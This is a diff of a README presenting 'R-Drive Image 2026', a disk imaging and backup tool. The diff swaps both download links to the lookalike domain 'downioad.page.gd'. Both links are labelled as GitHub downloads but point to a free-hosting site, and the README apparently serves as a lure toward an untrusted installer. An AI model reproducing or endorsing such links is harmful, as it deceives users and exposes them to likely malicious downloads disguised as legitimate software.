@@ -2,7 +2,7 @@
 
 R-Drive Image 2026 is a comprehensive utility designed for creating disk image files and restoring them on the fly. It provides a powerful and reliable way to back up your Windows system, entire hard drives, or specific partitions, allowing for quick recovery from data loss or system failures. This 2026 edition enhances the core functionality for modern storage solutions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Core Capabilities
 
@@ -43,7 +43,7 @@ A: The size depends on the amount of data on the source disk or partition. Using
 
 For the latest version, please visit the official download location.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
